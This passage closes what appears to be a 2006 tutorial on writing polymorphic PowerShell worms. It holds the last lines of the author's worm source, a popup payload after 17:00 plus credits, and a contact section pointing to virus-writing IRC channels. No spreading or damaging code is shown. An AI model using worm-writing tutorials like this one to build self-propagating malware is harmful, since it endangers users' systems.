+|Directory. # =========================================================== $gtCurrentDate = get-date                                                                             |
+|-DisplayHint time if ($gtCurrentDate -gt &quot;17:00:00&quot;) { $wshs.popup(&quot;This is the first polymorphic PowerShell Worm. This Worm was written by sk0r                               |
+|alias Czybik. This Worm is &copy;2006 by sk0r alias Czybik To ask some questions email me @ sk0r1337@gmx.de www.sk0r-scripts.tk -                                                   |
+|www.sk0r-virii.tk - www.czybik-kit.tk &quot;,10,&quot;PowerShell Polymorphic Worm &copy;2006 by sk0r alias Czybik&quot;); } # the Variable gtCurrentDate uses the                                  |
+|function get-date with parameter time # to get the current time. If the time is greater the 17:00:00 a popup # message will appear. #                                          |
+|================================================================== exit ; # This command exits the                                                                             |
+|script # ==================== # # This Worm is &copy;2006 by sk0r alias Czybik. #sk0r alias Czybik                                                                                  |
+|                                                                                                                                                                               |
++-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+
+ ===========
+|7: About me|
+ ===========
+
+For questions about the tutorial, the PowerShell, if you have something new and interesting
+found out or if you just want to show me your sources of PowerShell worms, feel free
+to mail me: sk0r1337@gmx.de or write something in my guestbook on my homepage, best regards
+sk0r/Czybik.
+
+You can also find me in IRC: #vxers, #vx-lab and #eof-project @ Undernet
+</pre></body></html>
